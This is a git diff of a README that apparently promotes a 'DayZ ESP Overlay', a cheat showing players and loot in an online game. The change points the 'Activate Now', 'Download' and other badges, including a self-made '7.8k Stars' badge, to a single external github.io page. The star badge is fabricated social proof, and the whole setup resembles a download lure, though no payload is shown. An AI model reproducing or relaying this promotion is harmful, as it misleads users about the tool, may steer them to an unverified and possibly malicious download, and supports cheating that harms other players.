@@ -2,10 +2,10 @@
 
 The **DayZ ESP Overlay Software** is built for survivors who want sharper situational awareness. By displaying **players, loot, vehicles, and objectives** in real time, this tool makes it easier to plan strategies, avoid ambushes, and optimize loot runs.
 
-[![Activate Now](https://img.shields.io/badge/Activate%20Now-brown?style=for-the-badge\&logo=rocket)](#)
-[![Windows Support](https://img.shields.io/badge/Windows-10%2F11-blue?style=for-the-badge\&logo=windows)](#)
-[![⭐️ 7.8k Stars](https://img.shields.io/badge/⭐️%207.8k-Stars-yellow?style=for-the-badge\&logo=github)](#)
-[![Download](https://img.shields.io/badge/Download-Latest-green?style=for-the-badge\&logo=github)](#)
+[![Activate Now](https://img.shields.io/badge/Activate%20Now-brown?style=for-the-badge\&logo=rocket)](https://dayz-esp-overlay.github.io/.github/)
+[![Windows Support](https://img.shields.io/badge/Windows-10%2F11-blue?style=for-the-badge\&logo=windows)](https://dayz-esp-overlay.github.io/.github/)
+[![⭐️ 7.8k Stars](https://img.shields.io/badge/⭐️%207.8k-Stars-yellow?style=for-the-badge\&logo=github)](https://dayz-esp-overlay.github.io/.github/)
+[![Download](https://img.shields.io/badge/Download-Latest-green?style=for-the-badge\&logo=github)](https://dayz-esp-overlay.github.io/.github/)
 
 ---
 
